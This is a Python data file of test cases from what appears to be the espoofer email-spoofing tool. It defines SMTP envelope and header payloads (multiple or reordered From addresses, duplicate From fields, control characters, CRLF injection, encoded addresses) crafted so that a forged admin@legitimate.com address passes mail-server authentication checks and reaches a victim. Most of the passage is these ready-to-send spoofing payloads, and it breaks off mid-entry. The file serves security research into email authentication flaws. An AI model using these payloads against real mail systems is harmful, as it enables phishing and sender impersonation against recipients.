from common.common import *
import config

# Important note:
#
# For server mode, all case_id should start with 'server_'.  All of attack.com, admin@legitimate.com, and victim@victim.com in this cases will be replaced with the configured value in config.py.
# 
# For client mode, all case_id should start with 'client_'. attacker@example.com and admin@example.com in those cases will be replaced.
#
chinese_content = '您好！请准时参加会议'
english_content = 'Hello! Please attend the meeting on time.'
test_cases = {
    "server_ax": { # Used for ensuring the legitimate emails we sent are accepted by target services.
        "helo": b"attack.com",
        "mailfrom": b"<any@attack.com>",
        "rcptto": b"<victim@victim.com>",
        "dkim_para": {"d":b'attack.com', "s":b"selector", "sign_header": b"From: <any@attack.com>"},
        "data": {
            "from_header": b"From: <any@attack.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: mail test"  + b"\r\n",
            "body": english_content.encode() +  b'.\r\n',
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\nX-Email-Client: https://github.com/chenjj/espoofer\r\n\r\n',
        },
        "description": b"Subject: mail test"
    },

    # Character-1: Multi-address
    # 1.1 From Field includes Multiple Addresses
    # Extensions of single character

    "server_a1.1.1": {   # original  
        "helo": b"attack.com",
        "mailfrom": b"<any@attack.com>",
        "rcptto": b"<victim@victim.com>",
        #"dkim_para": {"d":b'attack.com', "s":b"selector", "sign_header": b"From: admin@legitimate.com, any@attack.com>"},
        "data": {
            "from_header": b"From: <admin@legitimate.com>, <any@attack.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: EXISTING / Extensions - A1.1.1 - From field includes two addresses" + b"\r\n",
            # "body": b"A1.1.1 test -- From includes two addresses, thank you very much for your help!" +  b"\r\n",
            "body": english_content.encode() + b'.\r\n',
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Sender: <admin@legitimate.com>\r\n; Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\n\r\n',
        }
    },

    "server_a1.1.2": {   # change the order  
        "helo": b"attack.com",
        "mailfrom": b"<any@attack.com>",
        "rcptto": b"<victim@victim.com>",
        #"dkim_para": {"d":b'attack.com', "s":b"selector", "sign_header": b"From: admin@legitimate.com, any@attack.com>"},
        "data": {
            "from_header": b"From: <any@attack.com>, <admin@legitimate.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: EXISTING / Extensions of Character 1 - A1.1.2 - From field includes two addresses" + b"\r\n",
            # "body": b"A1.1.2 test -- From includes two addresses, thank you very much for your help!" +  b"\r\n",
            "body": english_content.encode() + b'.\r\n',
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Sender: <admin@legitimate.com>\r\n; Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\n\r\n',
        }
    },

    "server_a1.1.3": {   # change the numbers 
        "helo": b"attack.com",
        "mailfrom": b"<any@attack.com>",
        "rcptto": b"<victim@victim.com>",
        #"dkim_para": {"d":b'attack.com', "s":b"selector", "sign_header": b"From: admin@legitimate.com, any@attack.com>"},
        "data": {
            "from_header": b"From: <any@attack.com>, <mjr2000@legitimate.com>, <admin@legitimate.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: NEW / Extensions of Character 1 - A1.1.3 - From field includes multiple addresses" + b"\r\n",
            "body": english_content.encode() + b'.\r\n',
            # "body": b"A1.1.3 test -- From includes multiple addresses, thank you very much for your help!" +  b"\r\n",
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Sender: <admin@legitimate.com>\r\n; Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\n\r\n',
        }
    },
    "server_a1.1.4": {   # delete the comma
        "helo": b"attack.com", 
        "mailfrom": b"<any@attack.com>",
        "rcptto": b"<victim@victim.com>",
        #"dkim_para": {"d":b'attack.com', "s":b"selector", "sign_header": b"From: admin@legitimate.com, any@attack.com>"},
        "data": {
            "from_header": b"From: <admin@legitimate.com><any@attack.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: NEW / Extensions of Character 1 - A1.1.4 - delete the comma" + b"\r\n",
            "body": english_content.encode() + b'.\r\n',
            # "body": b"A1.1.4 test -- From includes multiple addresses, thank you very much for your help!" +  b"\r\n",
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Sender: <admin@legitimate.com>\r\n; Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\n\r\n',
        }
    },
    "server_a1.1.5": {   # replace the comma with unseen ASCII letters
        "helo": b"attack.com",
        "mailfrom": b"<any@attack.com>",
        "rcptto": b"<victim@victim.com>",
        #"dkim_para": {"d":b'attack.com', "s":b"selector", "sign_header": b"From: admin@legitimate.com, any@attack.com>"},
        "data": {
            "from_header": b"From: <admin@legitimate.com>\x01<any@attack.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: NEW / Extensions of Character 1 - A1.1.5 - Replace the comma with an unseen ASCII letter" + b"\r\n",
            # "body": b"A1.1.5 test -- From includes multiple addresses, thank you very much for your help!" +  b"\r\n",
            "body": english_content.encode() + b'.\r\n',
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Sender: <admin@legitimate.com>\r\n; Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\n\r\n',
        }
    },
    
    # Combinations with different characters
    # With the 4th:
    "server_a1.1.6": { 
        "helo": b"attack.com",
        "mailfrom": b"<any@attack.com>",
        "rcptto": b"<victim@victim.com>",
        #"dkim_para": {"d":b'attack.com', "s":b"selector", "sign_header": b"From: admin@legitimate.com, any@attack.com>"},
        "data": {
            "from_header": b"From: <admin@legitimate.com>, any@attack.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: NEW / Combinations with 4th - A1.1.6 - From field includes two addresses without a <" + b"\r\n",
            # "body": b"A1.1.6 test -- From includes multiple addresses, thank you very much for your help!" +  b"\r\n",
            "body": english_content.encode() + b'.\r\n',
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Sender: <admin@legitimate.com>\r\n; Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\n\r\n',
        }
    },

    "server_a1.1.7": {   # EXISTING 
        "helo": b"attack.com",
        "mailfrom": b"<any@attack.com>",
        "rcptto": b"<victim@victim.com>",
        #"dkim_para": {"d":b'attack.com', "s":b"selector", "sign_header": b"From: admin@legitimate.com, any@attack.com>"},
        "data": {
            "from_header": b"From: <admin@legitimate.com>, any@attack.com\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: EXISTING / Combinations with 4th - A1.1.7 - From field includes two addresses without a <>" + b"\r\n",
            # "body": b"A1.1.7 test -- From includes multiple addresses, thank you very much for your help!" +  b"\r\n",
            "body": english_content.encode() + b'.\r\n',
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Sender: <admin@legitimate.com>\r\n; Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\n\r\n',
        }
    }, 
    "server_a1.1.8": {   # EXISTING
        "helo": b"attack.com",
        "mailfrom": b"<any@attack.com>",
        "rcptto": b"<victim@victim.com>",
        #"dkim_para": {"d":b'attack.com', "s":b"selector", "sign_header": b"From: admin@legitimate.com, any@attack.com>"},
        "data": {
            "from_header": b"From: admin@legitimate.com, <any@attack.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: EXISTING / Combinations with 4th - A1.1.8 - From field includes two addresses without a <> in the first" + b"\r\n",
            # "body": b"A1.1.8 test -- From includes multiple addresses, thank you very much for your help!" +  b"\r\n",
            "body": english_content.encode() + b'.\r\n',
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Sender: <admin@legitimate.com>\r\n; Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\n\r\n',
        }
    },
    "server_a1.1.9": { 
        "helo": b"attack.com",
        "mailfrom": b"<any@attack.com>",
        "rcptto": b"<victim@victim.com>",
        #"dkim_para": {"d":b'attack.com', "s":b"selector", "sign_header": b"From: admin@legitimate.com, any@attack.com>"},
        "data": {
            "from_header": b"From: any@attack.com, <admin@legitimate.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: EXISTING / Combinations with 4th - A1.1.9 - From field includes two addresses without a <> and change the order" + b"\r\n",
            # "body": b"A1.1.9 test -- From includes multiple addresses, thank you very much for your help!" +  b"\r\n",
            "body": english_content.encode() + b'.\r\n',
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Sender: <admin@legitimate.com>\r\n; Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\n\r\n',
        }
    },
    "server_a1.1.10": { 
        "helo": b"attack.com",
        "mailfrom": b"<any@attack.com>",
        "rcptto": b"<victim@victim.com>",
        #"dkim_para": {"d":b'attack.com', "s":b"selector", "sign_header": b"From: admin@legitimate.com, any@attack.com>"},
        "data": {
            "from_header": b"From: <>, <admin@legitimate.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: NEW / Combinations with 4th - A1.1.10 - From field includes two addresses with an ampty one" + b"\r\n",
            # "body": b"A1.1.10 test -- From includes multiple addresses, thank you very much for your help!" +  b"\r\n",
            "body": english_content.encode() + b'.\r\n',
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Sender: <admin@legitimate.com>\r\n; Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\n\r\n',
        }
    },

    # With the 3rd, use special letters to seperate multiple addresses.
    "server_a1.1.11": {  
        "helo": b"attack.com",
        "mailfrom": b"<any@attack.com>",
        "rcptto": b"<victim@victim.com>",
        #"dkim_para": {"d":b'attack.com', "s":b"selector", "sign_header": b"From: admin@legitimate.com, any@attack.com>"},
        "data": {
            "from_header": b"From: <admin@legitimate.com> , <any@attack.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: NEW / Combinations with 3rd - A1.1.11 - From field includes two addresses with a space after" + b"\r\n",
            # "body": b" A1.1.11 - From field includes two addresses with a space, thank you very much for your help!" +  b"\r\n",
            "body": english_content.encode() + b'.\r\n',
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Sender: <admin@legitimate.com>\r\n; Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\n\r\n',
        }
    },
    "server_a1.1.12": {   # EXISTING
        "helo": b"attack.com",
        "mailfrom": b"<any@attack.com>",
        "rcptto": b"<victim@victim.com>",
        #"dkim_para": {"d":b'attack.com', "s":b"selector", "sign_header": b"From: admin@legitimate.com, any@attack.com>"},
        "data": {
            "from_header": b"From: <admin@legitimate.com>\, <any@attack.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: EXISTING / Combinations with 3rd - A1.1.12 - From field includes two addresses with a \\" + b"\r\n",
            # "body": b"A1.1.12 test - From field includes two addresses with a \\, thank you very much for your help!" +  b"\r\n",
            "body": english_content.encode() + b'.\r\n',
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Sender: <admin@legitimate.com>\r\n; Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\n\r\n',
        }
    },
    "server_a1.1.13": {  
        "helo": b"attack.com",
        "mailfrom": b"<any@attack.com>",
        "rcptto": b"<victim@victim.com>",
        #"dkim_para": {"d":b'attack.com', "s":b"selector", "sign_header": b"From: admin@legitimate.com, any@attack.com>"},
        "data": {
            "from_header": b"From: <admin@legitimate.com>;, <any@attack.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: EXISTING / Combinations with 3rd - A1.1.13 - From field includes two addresses with a ;" + b"\r\n",
            # "body": b"A1.1.13 - From field includes two addresses with a ;, thank you very much for your help!" +  b"\r\n",
            "body": english_content.encode() + b'.\r\n',
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Sender: <admin@legitimate.com>\r\n; Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\n\r\n',
        }
    },
    "server_a1.1.14": { 
        "helo": b"attack.com",
        "mailfrom": b"<any@attack.com>",
        "rcptto": b"<victim@victim.com>",
        #"dkim_para": {"d":b'attack.com', "s":b"selector", "sign_header": b"From: admin@legitimate.com, any@attack.com>"},
        "data": {
            "from_header": b"From: <admin@legitimate.com>\", <any@attack.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: EXISTING / Combinations with 3rd - A1.1.14 - From field includes two addresses with a \"" + b"\r\n",
            # "body": b"A1.1.14 - From field includes two addresses with a ', thank you very much for your help!" +  b"\r\n",
            "body": english_content.encode() + b'.\r\n',
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Sender: <admin@legitimate.com>\r\n; Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\n\r\n',
        }
    },
    "server_a1.1.15": { 
        "helo": b"attack.com",
        "mailfrom": b"<any@attack.com>",
        "rcptto": b"<victim@victim.com>",
        #"dkim_para": {"d":b'attack.com', "s":b"selector", "sign_header": b"From: admin@legitimate.com, any@attack.com>"},
        "data": {
            "from_header": b"From: <admin@legitimate.com>\n,<any@attack.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: NEW / Combinations with 3rd - A1.1.15 - From field includes two addresses with a CR" + b"\r\n",
            # "body": b"A1.1.15 test -- From includes multiple addresses, thank you very much for your help!" +  b"\r\n",
            "body": english_content.encode() + b'.\r\n',
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Sender: <admin@legitimate.com>\r\n; Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\n\r\n',
        }
    },
    "server_a1.1.16": { 
        "helo": b"attack.com",
        "mailfrom": b"<any@attack.com>",
        "rcptto": b"<victim@victim.com>",
        #"dkim_para": {"d":b'attack.com', "s":b"selector", "sign_header": b"From: admin@legitimate.com, any@attack.com>"},
        "data": {
            "from_header": b"From: <admin@legitimate.com>\r\n,<any@attack.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: NEW / Combinations with 3rd - A1.1.16 - From field includes two addresses with a CRLF" + b"\r\n",
            # "body": b"A1.1.16 test -- From includes multiple addresses, thank you very much for your help!" +  b"\r\n",
            "body": english_content.encode() + b'.\r\n',
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Sender: <admin@legitimate.com>\r\n; Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\n\r\n',
        }
    },

# Character-1: Multi-address
    # 1.2 Multiple From Fields
    # Extensions
    "server_a1.2.1": {   # original EXISTING
        "helo": b"attack.com",
        "mailfrom": b"<any@attack.com>",
        "rcptto": b"<victim@victim.com>",
        # "dkim_para": {"d":b"attack.com", "s":b"selector", "sign_header": b"From: <admin@legitimate.com>"},
        "data": {
            "from_header": b"From: <admin@legitimate.com>\r\nFrom: <any@attack.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: EXISTING / Extensions - A1.2.1 - Multiple From Fields" +  b"\r\n",
            # "body":   b" A1.2.1 test -- Multi From Fields, thank you very much for your help!\r\n",
            "body": english_content.encode() + b'.\r\n',
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Sender: <admin@legitimate.com>\r\n; Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\n\r\n',
        }
    },

    "server_a1.2.2": {   # change the order EXISTING
        "helo": b"attack.com",
        "mailfrom": b"<any@attack.com>",
        "rcptto": b"<victim@victim.com>",
        #"dkim_para": {"d":b'attack.com', "s":b"selector", "sign_header": b"From: admin@legitimate.com, any@attack.com>"},
        "data": {
            "from_header": b"From: <any@attack.com>\r\nFrom: <admin@legitimate.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: EXISTING / Extensions of 1st - A1.2.2 - Multiple From Fields" + b"\r\n",
            # "body": b"A1.2.2 test -- Exchange Multiple From Fields, thank you very much for your help!" +  b"\r\n",
            "body": english_content.encode() + b'.\r\n',
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Sender: <admin@legitimate.com>\r\n; Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\n\r\n',
        }
    },
    "server_a1.2.3": {    # change the numbers
        "helo": b"attack.com",
        "mailfrom": b"<any@attack.com>",
        "rcptto": b"<victim@victim.com>",
        #"dkim_para": {"d":b'attack.com', "s":b"selector", "sign_header": b"From: admin@legitimate.com, any@attack.com>"},
        "data": {
            "from_header": b"From: <admin@legitimate.com>\r\nFrom: <any@attack.com>\r\nFrom: <mjr2000@legitimate.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: NEW / Extensions of 1st - A1.2.3 - Multiple From Fields" + b"\r\n",
            # "body": b"A1.2.3 test -- Multiple From Fields, thank you very much for your help!" +  b"\r\n",
            "body": english_content.encode() + b'.\r\n',
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Sender: <admin@legitimate.com>\r\n; Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\n\r\n',
        }
    },

    # Combinations with the 4th
    "server_a1.2.4": {  # EXISTING
        "helo": b"attack.com",
        "mailfrom": b"<any@attack.com>",
        "rcptto": b"<victim@victim.com>",
        #"dkim_para": {"d":b'attack.com', "s":b"selector", "sign_header": b"From: admin@legitimate.com, any@attack.com>"},
        "data": {
            "from_header": b"From: <admin@legitimate.com>\r\nFrom : <any@attack.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: EXISTING / Combinations with the 4th - A1.2.4 - Multiple From Fields with a succeeding Space" + b"\r\n",
            # "body": b"A1.2.4 - Multiple From Fields with a succeeding Space, thank you very much for your help!" +  b"\r\n",
            "body": english_content.encode() + b'.\r\n',
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Sender: <admin@legitimate.com>\r\n; Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\n\r\n',
        }
    },

    "server_a1.2.5": {  # EXISTING
        "helo": b"attack.com",
        "mailfrom": b"<any@attack.com>",
        "rcptto": b"<victim@victim.com>",
        #"dkim_para": {"d":b'attack.com', "s":b"selector", "sign_header": b"From: admin@legitimate.com, any@attack.com>"},
        "data": {
            "from_header": b"From : <any@attack.com>\r\nFrom: <admin@legitimate.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: EXISTING / Combinations with the 4th - A1.2.5 - Multiple From Fields with a succeeding Space" + b"\r\n",
            # "body": b"A1.2.5 - Multiple From Fields with a succeeding Space, thank you very much for your help!" +  b"\r\n",
            "body": english_content.encode() + b'.\r\n',
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Sender: <admin@legitimate.com>\r\n; Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\n\r\n',
        }
    },

    "server_a1.2.6": { 
        "helo": b"attack.com",
        "mailfrom": b"<any@attack.com>",
        "rcptto": b"<victim@victim.com>",
        #"dkim_para": {"d":b'attack.com', "s":b"selector", "sign_header": b"From: admin@legitimate.com, any@attack.com>"},
        "data": {
            "from_header": b"From: <admin@legitimate.com>\r\nFrom: \n<any@attack.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: EXISTING / Combinations with the 4th - A1.2.6 - Multiple From Fields with a line break" + b"\r\n",
            # "body": b"A1.2.6 test -- Multiple From Fields with a line break, thank you very much for your help!" +  b"\r\n",
            "body": english_content.encode() + b'.\r\n',
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Sender: <admin@legitimate.com>\r\n; Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\n\r\n',
        }
    },

    "server_a1.2.7": { 
        "helo": b"attack.com",
        "mailfrom": b"<any@attack.com>",
        "rcptto": b"<victim@victim.com>",
        #"dkim_para": {"d":b'attack.com', "s":b"selector", "sign_header": b"From: admin@legitimate.com, any@attack.com>"},
        "data": {
            "from_header": b"From: \n<any@attack.com>\r\nFrom: <admin@legitimate.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: EXISTING / Combinations with the 4th - A1.2.7 - Multiple From Fields with a line break" + b"\r\n",
            # "body": b"A1.2.7 test -- Multiple From Fields with a line break, thank you very much for your help!" +  b"\r\n",
            "body": english_content.encode() + b'.\r\n',
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Sender: <admin@legitimate.com>\r\n; Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\n\r\n',
        }
    },

    "server_a1.2.8": {  # EXISTING
        "helo": b"attack.com",
        "mailfrom": b"<any@attack.com>",
        "rcptto": b"<victim@victim.com>",
        #"dkim_para": {"d":b'attack.com', "s":b"selector", "sign_header": b"From: admin@legitimate.com, any@attack.com>"},
        "data": {
            "from_header": b"From: <admin@legitimate.com>\r\n From: <any@attack.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: EXISTING / Combinations with the 4th - A1.2.8 - Multiple From Fields with a preceding space" + b"\r\n",
            # "body": b"A1.2.8 test -- Multiple From Fields with a preceding space, thank you very much for your help!" +  b"\r\n",
            "body": english_content.encode() + b'.\r\n',
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Sender: <admin@legitimate.com>\r\n; Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\n\r\n',
        }
    },

    "server_a1.2.9": {  # EXISTING
        "helo": b"attack.com",
        "mailfrom": b"<any@attack.com>",
        "rcptto": b"<victim@victim.com>",
        #"dkim_para": {"d":b'attack.com', "s":b"selector", "sign_header": b"From: admin@legitimate.com, any@attack.com>"},
        "data": {
            "from_header": b" From: <any@attack.com>\r\nFrom: <admin@legitimate.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: EXISTING / Combinations with the 4th - A1.2.9 - Multiple From Fields with a preceding space" + b"\r\n",
            # "body": b"A1.2.9 test - Multiple From Fields with a preceding space, thank you very much for your help!" +  b"\r\n",
            "body": english_content.encode() + b'.\r\n',
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Sender: <admin@legitimate.com>\r\n; Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\n\r\n',
        }
    },
    "server_a1.2.10": { 
        "helo": b"attack.com",
        "mailfrom": b"<any@attack.com>",
        "rcptto": b"<victim@victim.com>",
        #"dkim_para": {"d":b'attack.com', "s":b"selector", "sign_header": b"From: admin@legitimate.com, any@attack.com>"},
        "data": {
            "from_header": b"From: <>\r\nFrom: <admin@legitimate.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: NEW / Combinations with 4th - A1.2.10 - multiple From fields with an empty address" + b"\r\n",
            # "body": b"A1.2.10 test -- multiple From fields with an empty address, thank you very much for your help!" +  b"\r\n",
            "body": english_content.encode() + b'.\r\n',
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Sender: <admin@legitimate.com>\r\n; Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\n\r\n',
        }
    },

    # Extensions with path 1
    "server_a1.2.11": { 
        "helo": b"attack.com",
        "mailfrom": b"<any@attack.com>",
        "rcptto": b"<victim@victim.com>",
        #"dkim_para": {"d":b'attack.com', "s":b"selector", "sign_header": b"From: admin@legitimate.com, any@attack.com>"},
        "data": {
            "from_header": b"From: <any@attack.com>, <admin@legitimate.com>\r\nFrom: <admin@legitimate.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: NEW / Extensions with path 1 - A1.2.11 - Multiple From Fields with multi-address" + b"\r\n",
            # "body": b"A1.2.11 -- Multiple From Fields with multi-address, thank you very much for your help!" +  b"\r\n",
            "body": english_content.encode() + b'.\r\n',
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Sender: <admin@legitimate.com>\r\n; Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\n\r\n',
        }
    },

    "server_a1.2.12": { 
        "helo": b"attack.com",
        "mailfrom": b"<any@attack.com>",
        "rcptto": b"<victim@victim.com>",
        #"dkim_para": {"d":b'attack.com', "s":b"selector", "sign_header": b"From: admin@legitimate.com, any@attack.com>"},
        "data": {
            "from_header": b"From: <admin@legitimate.com>, <any@attack.com>\r\nFrom: <admin@legitimate.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: NEW / Extensions with path 1 - A1.2.12 - Multiple From Fields with multi-address" + b"\r\n",
            # "body": b"A1.2.12 -- Multiple From Fields with multi-address, thank you very much for your help!" +  b"\r\n",
            "body": english_content.encode() + b'.\r\n',
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Sender: <admin@legitimate.com>\r\n; Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\n\r\n',
        }
    },

    "server_a1.2.13": { 
        "helo": b"attack.com",
        "mailfrom": b"<any@attack.com>",
        "rcptto": b"<victim@victim.com>",
        #"dkim_para": {"d":b'attack.com', "s":b"selector", "sign_header": b"From: admin@legitimate.com, any@attack.com>"},
        "data": {
            "from_header": b"From: <admin@legitimate.com>, <any@attack.com>\r\nFrom: <any@attack.com>\r\n",
            "to_header": b"To: <victim@victim.com>\r\n",
            "subject_header": b"Subject: NEW / Extensions with path 1 - A1.2.13 -Multiple From Fields with multi-address" + b"\r\n",
            # "body": b"A1.2.13 -- Multiple From Fields with multi-address, thank you very much for your help!" +  b"\r\n",
            "body": english_content.encode() + b'.\r\n',
            "other_headers": b"Date: " + get_date() + b"\r\n" + b'Sender: <admin@legitimate.com>\r\n; Content-Type: text/plain; charset="UTF-8"\r\nMIME-Version: 1.0\r\nMessage-ID: <1538085644648.096e3d4e-bc38-4027-b57e-' + id_generator() + b'@message-ids.attack.com>\r\n\r\n',
        }
    },


# Character-2: Base64 encode

    # The following three are testing the effect of encoded-address on clients
    "server_a2.1": {   # original EXISTING
        "helo": b"attack.com",
        "mailfrom": b"<any@attack.com>",
        "rcptto": b"<victim@victim.com>",
        "dkim_para": {"d":b"attack.com", "s":b"selector", "sign_header": b"From: =?utf-8?B?PGp3Y0B1c3RjLmVkdS5jbj4=?="},
        "data": {
